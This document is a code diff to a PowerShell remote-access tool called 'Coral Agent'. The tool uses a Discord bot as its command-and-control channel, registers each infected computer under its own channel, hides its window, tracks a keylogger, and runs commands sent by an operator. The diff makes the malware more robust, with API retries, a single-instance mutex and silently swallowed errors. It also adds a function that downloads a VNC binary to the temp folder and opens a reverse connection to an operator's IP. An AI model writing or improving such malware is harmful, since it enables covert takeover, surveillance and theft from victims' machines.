@@ -5,44 +5,69 @@ $global:hidewindow = $true
 $global:keyloggerstatus = $false
 
 
-
+function Invoke-DiscordAPI {
+    param(
+        [string]$Url,
+        [hashtable]$Headers,
+        [string]$Method = "GET",
+        [string]$Body = $null,
+        [int]$RetryCount = 2,
+        [int]$DelayMs = 500
+    )
+    
+    $attempt = 0
+    do {
+        try {
+            Start-Sleep -Milliseconds ($DelayMs * $attempt)
+            
+            $wc = New-Object System.Net.WebClient
+            foreach ($key in $Headers.Keys) {
+                $wc.Headers.Add($key, $Headers[$key])
+            }
+            
+            if ($Method -eq "POST" -and $Body) {
+                $wc.Headers.Add("Content-Type", "application/json")
+                return $wc.UploadString($Url, "POST", $Body)
+            } else {
+                return $wc.DownloadString($Url)
+            }
+        }
+        catch {
+            $attempt++
+            if ($_.Exception.Message -match "429|Too Many Requests" -and $attempt -le $RetryCount) {
+                Write-Host "Rate limited, retrying in $($DelayMs * $attempt)ms..."
+                continue
+            }
+            throw
+        }
+    } while ($attempt -le $RetryCount)
+}
 
 
 # =============================================================== CORE DISCORD FUNCTIONS =========================================================================
 
 # Get bot user ID function
 Function Get_BotUserId {
-    $headers = @{
-        'Authorization' = "Bot $global:token"
-    }
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", $headers.Authorization)
-    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
-    $botInfo = $botInfo | ConvertFrom-Json
-    return $botInfo.id
+    $headers = @{ 'Authorization' = "Bot $global:token" }
+    $botInfo = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me" -Headers $headers
+    return ($botInfo | ConvertFrom-Json).id
 }
 
-# Check if catgory exists function
 Function CheckCategoryExists {
-    $headers = @{
-        'Authorization' = "Bot $global:token"
-    }
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", $headers.Authorization)
+    $headers = @{ 'Authorization' = "Bot $global:token" }
     
     # Get guild ID
-    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
+    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
     $guildID = ($response | ConvertFrom-Json)[0].id
-    
+
     # Get all channels in guild
-    $channels = $wc.DownloadString("https://discord.com/api/v10/guilds/$guildID/channels")
+    $channels = Invoke-DiscordAPI -Url "https://discord.com/api/v10/guilds/$guildID/channels" -Headers $headers
     $channelList = $channels | ConvertFrom-Json
     
-    # Look for existing category with computer name
+    # Rest of function remains the same...
     foreach ($channel in $channelList) {
         if ($channel.type -eq 4 -and $channel.name -eq $env:COMPUTERNAME) {
             $global:CategoryID = $channel.id
-            # Look for existing coral-control channel
             foreach ($subchannel in $channelList) {
                 if ($subchannel.type -eq 0 -and $subchannel.name -eq "coral-control" -and $subchannel.parent_id -eq $channel.id) {
                     $global:ChannelID = $subchannel.id
@@ -53,63 +78,45 @@ Function CheckCategoryExists {
     }
     return $false
 }
-
 # Create a new category for text channels function
 Function NewChannelCategory{
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }
-    $guildID = $null
-    while (!($guildID)){    
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("Authorization", $headers.Authorization)    
-        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
-        $guilds = $response | ConvertFrom-Json
-        foreach ($guild in $guilds) {
-            $guildID = $guild.id
-        }
-        Start-Sleep -Seconds 3
-    }
+    $headers = @{ 'Authorization' = "Bot $token" }
+    
+    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
+    $guilds = $response | ConvertFrom-Json
+    $guildID = $guilds[0].id
+    
     $uri = "https://discord.com/api/guilds/$guildID/channels"
     $body = @{
         "name" = "$env:COMPUTERNAME"
         "type" = 4
-    } | ConvertTo-Json    
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", "Bot $token")
-    $wc.Headers.Add("Content-Type", "application/json")
-    $response = $wc.UploadString($uri, "POST", $body)
+    } | ConvertTo-Json
+    
+    $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
     $responseObj = ConvertFrom-Json $response
     $global:CategoryID = $responseObj.id
 }
 
 # Create a new channel function
 Function NewChannel{
-param([string]$name)
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }    
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", $headers.Authorization)    
-    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
+    param([string]$name)
+    $headers = @{ 'Authorization' = "Bot $token" }
+    
+    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
     $guilds = $response | ConvertFrom-Json
-    foreach ($guild in $guilds) {
-        $guildID = $guild.id
-    }
+    $guildID = $guilds[0].id
+    
     $uri = "https://discord.com/api/guilds/$guildID/channels"
     $body = @{
         "name" = "$name"
         "type" = 0
         "parent_id" = $CategoryID
-    } | ConvertTo-Json    
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", "Bot $token")
-    $wc.Headers.Add("Content-Type", "application/json")
-    $response = $wc.UploadString($uri, "POST", $body)
+    } | ConvertTo-Json
+    
+    $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
     $responseObj = ConvertFrom-Json $response
     $global:ChannelID = $responseObj.id
 }
-
 function sendMsg {
     param([string]$Message,[string]$Embed)
 
@@ -148,9 +155,7 @@ function Send_SingleMessage {
     param([string]$Content)
     
     $url = "https://discord.com/api/v10/channels/$SessionID/messages"
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", "Bot $token")
-    $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
+    $headers = @{ 'Authorization' = "Bot $token" }
     
     # Clean the message
     $cleanMessage = Clean_MessageContent -InputMessage $Content
@@ -165,11 +170,8 @@ function Send_SingleMessage {
     } | ConvertTo-Json -Compress
     
     try {
-        $response = $wc.UploadString($url, "POST", $jsonBody)
-        #write-host "Message sent successfully"
+        $response = Invoke-DiscordAPI -Url $url -Headers $headers -Method "POST" -Body $jsonBody
     } catch {
-        #Write-Host "Error sending message: $($_.Exception.Message)"
-        
         # Fallback with heavy sanitization
         try {
             $fallbackMessage = $Content -replace '[^\w\s\.\-\(\)\[\]\{\},:;!@#$%^&*+=<>?/|\\`~]', '?'
@@ -177,14 +179,12 @@ function Send_SingleMessage {
                 $fallbackMessage = $fallbackMessage.Substring(0, 1800) + "... (sanitized)"
             }
             $fallbackJson = @{ "content" = $fallbackMessage } | ConvertTo-Json -Compress
-            $response = $wc.UploadString($url, "POST", $fallbackJson)
-            #Write-Host "Message sent with fallback sanitization"
+            $response = Invoke-DiscordAPI -Url $url -Headers $headers -Method "POST" -Body $fallbackJson
         } catch {
-            #Write-Host "Fallback also failed: $($_.Exception.Message)"
+            # Final fallback - ignore the error
         }
     }
 }
-
 # Send message in chunks
 function Send_ChunkedMessage {
     param([string]$Content)
@@ -338,16 +338,17 @@ function sendFile {
 }
 
 Function PullMsg {
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", $headers.Authorization)
-    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$SessionID/messages")
-    $most_recent_message = ($messages | ConvertFrom-Json)[0]
-    if ($most_recent_message.author.id -ne $botId) {
-        $script:response = $most_recent_message.content
-        return $most_recent_message.content
+    $headers = @{ 'Authorization' = "Bot $token" }
+    try {
+        $messages = Invoke-DiscordAPI -Url "https://discord.com/api/v10/channels/$SessionID/messages" -Headers $headers
+        $most_recent_message = ($messages | ConvertFrom-Json)[0]
+        if ($most_recent_message.author.id -ne $botId) {
+            $script:response = $most_recent_message.content
+            return $most_recent_message.content
+        }
+    } catch {
+        # Don't spam errors for message polling
+        return $null
     }
 }
 
@@ -964,7 +965,6 @@ function Get_AgentJobOutput {
 function Stop_AllAgentJobs {
     if ($script:Jobs.Count -eq 0) {
         sendMsg -Message ":information_source: **No jobs to stop**"
-        sendMsg -Message ":stop_sign: **Stopped $stoppedCount job(s)**"
         return
     }
     
@@ -1075,18 +1075,38 @@ function Check_ScriptAlreadyRunning {
             }
         }
         
-        return $true
-        
     } catch {
         if ($UseDiscord) {
             sendMsg -Message ":warning: **Error during process check:** $($_.Exception.Message)"
         } else {
             Write-Host "Error during process check: $($_.Exception.Message)"
         }
-        return $true  # Allow continuation if check fails
+
     }
 }
-
+function Cleanup_CoralAgent {
+    try {
+        # Release mutex
+        if ($global:CoralMutex) {
+            $global:CoralMutex.ReleaseMutex()
+            $global:CoralMutex.Dispose()
+        }
+        
+        # Stop all jobs
+        if ($script:Jobs.Count -gt 0) {
+            Stop_AllAgentJobs
+        }
+        
+        # Stop keylogger
+        if ($global:keyloggerstatus) {
+            Stop_Keylogger
+        }
+        
+    } catch {
+        # Ignore cleanup errors
+    }
+    
+}
 # Trap for unexpected script termination
 trap {
     try {
@@ -1095,28 +1115,60 @@ trap {
     continue
 }
 # =============================================================== INITIALIZATION =========================================================================
-Check_ScriptAlreadyRunning -UseDiscord $false
+
+# Early check without Discord - this prevents most duplicate instances
+try {
+    $mutexName = "Global\CoralNetworkAgent_$env:COMPUTERNAME"
+    $global:CoralMutex = [System.Threading.Mutex]::new($false, $mutexName)
+    
+    if (-not $global:CoralMutex.WaitOne(100)) {
+        [Environment]::Exit(1)
+    }
+} catch [System.Threading.AbandonedMutexException] {
+    # Previous instance didn't exit cleanly, taking over...
+} catch {
+    # Continue anyway
+}
 
 # Initialize bot and channels
-$global:botId = Get_BotUserId
-# Modified initialization
-if (!(CheckCategoryExists)) {
-    NewChannelCategory
-    NewChannel -name 'coral-control'
-    $global:SessionID = $ChannelID
-} else {
-    $global:SessionID = $ChannelID
+try {
+    $global:botId = Get_BotUserId
+} catch {
+    exit 1
 }
-Check_ScriptAlreadyRunning -UseDiscord $true
+
+# Modified initialization
+try {
+    if (!(CheckCategoryExists)) {
+        NewChannelCategory
+        NewChannel -name 'coral-control'
+        $global:SessionID = $ChannelID
+    } else {
+        $global:SessionID = $ChannelID
+    }
+} catch {
+    exit 1
+}
 
 # hide window?
 if ($global:hidewindow) {
-    HideWindow
+    try {
+        HideWindow
+    } catch {
+        # Ignore window hiding errors
+    }
 }
 
 # Send initial connection message
-sendMsg -Message "``$env:COMPUTERNAME connected to Coral Network``"
+try {
+    sendMsg -Message "``$env:COMPUTERNAME connected to Coral Network``"
+} catch {
+    exit 1
+}
 # =============================================================== HELP MENU ========================================================================
+
+
+
 function display_help{
     $message = "
 :robot: **Coral Agent Help Menu:**
@@ -1152,6 +1204,33 @@ function display_help{
 
 "
     sendMsg -Message $message
+}
+
+
+# - VNU or whatever it was called
+Function StartUvnc{
+    param([string]$ip,[string]$port)
+    # FOR HOST
+    sendMsg -Message "Set up UVNC Lister, IP: $ip, Port: $port"
+    sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
+    $tempFolder = "$env:temp\vnc"
+    $vncDownload = 
+    $vncZip = "$tempFolder\winvnc.zip" 
+    if (!(Test-Path -Path $tempFolder)) {
+        New-Item -ItemType Directory -Path $tempFolder | Out-Null
+    }  
+    if (!(Test-Path -Path $vncZip)) {
+        Iwr -Uri $vncDownload -OutFile $vncZip
+    }
+    Start-Sleep 1
+    Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
+    Start-Sleep 1
+    rm -Path $vncZip -Force  
+    $proc = "$tempFolder\winvnc.exe"
+    Start-Process $proc -ArgumentList ("-run")
+    Start-Sleep 2
+    Start-Process $proc -ArgumentList ("-connect $ip::$port")
+    
 }
 # =============================================================== MAIN LOOP =========================================================================
 
@@ -1190,9 +1269,9 @@ while ($true) {
             'JOBS' { List_AgentJobs }
             'STOPALLJOBS' { Stop_AllAgentJobs }
             'EXIT' { 
+                sendMsg -Message "**$env:COMPUTERNAME disconnecting from Coral Network**"
                 Stop_AllAgentJobs
                 Cleanup-CoralAgent
-                sendMsg -Message ":no_entry: ``$env:COMPUTERNAME disconnecting from Coral Network`` :no_entry:"
                 exit 
             }
             default {
